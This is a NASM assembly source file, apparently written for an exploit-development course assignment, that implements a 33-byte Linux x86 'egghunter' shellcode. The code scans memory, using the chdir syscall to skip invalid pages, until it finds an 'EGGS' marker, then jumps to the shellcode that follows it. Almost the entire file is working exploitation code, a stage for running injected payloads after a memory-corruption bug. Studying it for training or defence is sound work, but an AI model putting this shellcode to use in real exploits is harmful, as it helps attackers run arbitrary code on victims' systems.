; Title: Linux x86 Egghunter shellcode (33 bytes)
; Filename: egghunter.nasm
; Author:  Mark Shaneck
; Website:  http://markshaneck.com
; 
; A more detailed description of this code can be found at
; http://markshaneck.com/SLAE32/slae32-assignment3
;
; Purpose: Egg hunter: Find shellcode located somewhere
; in memory that is prepended with a specific value

global _start

section .text
_start:
	; put FGGS into the register then decrement
	; so it contains EGGS, so that we only need
	; one copy of the egg
	mov esi, 0x53474746
	dec esi

	; Save the syscall for chdir in ecx
	xor ecx,ecx
	mov cl, 12

	; we don't care what ebx starts at, as it will wrap around
	; and eventually hit all memory addresses
align_page:
	; align edx to page boundary
	or dx,0xfff

nextaddr:	
	inc edx
	lea ebx, [edx+0x4] ; check 4 bytes later
	mov eax,ecx ; Put chdir syscall number in eax
	int 0x80   ; call chdir

	; If return value is 0xf2, go to the next page
	cmp al,0xf2
	je align_page
	
	; if it gets here then the memory address is valid
	; so we can check if "EGGS" is there
	cmp esi, dword [edx]

	; If comparison fails, jump to next addr
	jne nextaddr

	; Otherwise jump to the shellcode pointed at by ebx
	jmp ebx
	
